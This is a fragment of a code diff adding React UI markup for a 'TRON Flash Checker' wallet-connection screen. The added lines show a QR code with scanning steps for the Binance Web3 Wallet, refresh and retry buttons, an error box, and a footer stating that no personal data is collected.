+                  <div style={{ fontSize: 11.5, color: "#7a7f96", textAlign: "center" }}>Generating secure QR code...</div>
+                </div>
+              )}
+              {qrUri && (
+                <>
+                  <div style={{ background: "#fff", borderRadius: 12, padding: 10, boxShadow: "0 8px 30px rgba(0,0,0,0.4)" }}>
+                    <QRCodeSVG value={qrUri} size={200} bgColor="#ffffff" fgColor="#000000" level="M" marginSize={2} />
+                  </div>
+                  <div style={{ textAlign: "left", width: "100%" }}>
+                    <ol style={{ paddingLeft: 18, margin: 0, color: "#7a7f96", fontSize: 12, lineHeight: 2.1, listStyle: "decimal" }}>
+                      <li>Open the <strong style={{ color: "#e8eaf0" }}>Binance</strong> app on your phone</li>
+                      <li>Tap <strong style={{ color: "#e8eaf0" }}>Web3 Wallet</strong></li>
+                      <li>Tap the <strong style={{ color: "#e8eaf0" }}>scan</strong> icon and scan above</li>
+                    </ol>
+                  </div>
+                  <button onClick={startMobileConnect} style={{ background: "none", border: "1px solid rgba(255,255,255,0.1)",
+                    color: "#7a7f96", padding: "7px 18px", borderRadius: 8, cursor: "pointer", fontSize: 12, fontWeight: 500 }}>
+                    Refresh QR
+                  </button>
+                </>
+              )}
+            </div>
+          )}
+
+          {error && (
+            <div style={{ marginTop: 12, padding: "9px 12px", background: "rgba(239,0,39,0.07)",
+              border: "1px solid rgba(239,0,39,0.2)", borderRadius: 8, fontSize: 12, color: "#fca5a5", textAlign: "center" }}>
+              {error}&nbsp;&mdash;&nbsp;
+              <button onClick={mode === "mobile" ? startMobileConnect : startExtensionConnect}
+                style={{ background: "none", border: "none", color: "#10b981", cursor: "pointer", fontSize: 12, fontWeight: 600 }}>
+                Retry
+              </button>
+            </div>
+          )}
+        </div>
+
+        {/* -- Footer note -- */}
+        <div style={{ textAlign: "center", marginTop: 18, fontSize: 11, color: "rgba(122,127,150,0.6)", lineHeight: 1.5 }}>
+          TRON Flash Checker uses on-chain analysis only.<br />No personal data is collected or stored.
+        </div>
       </div>
     </div>
   );
 }
-
-
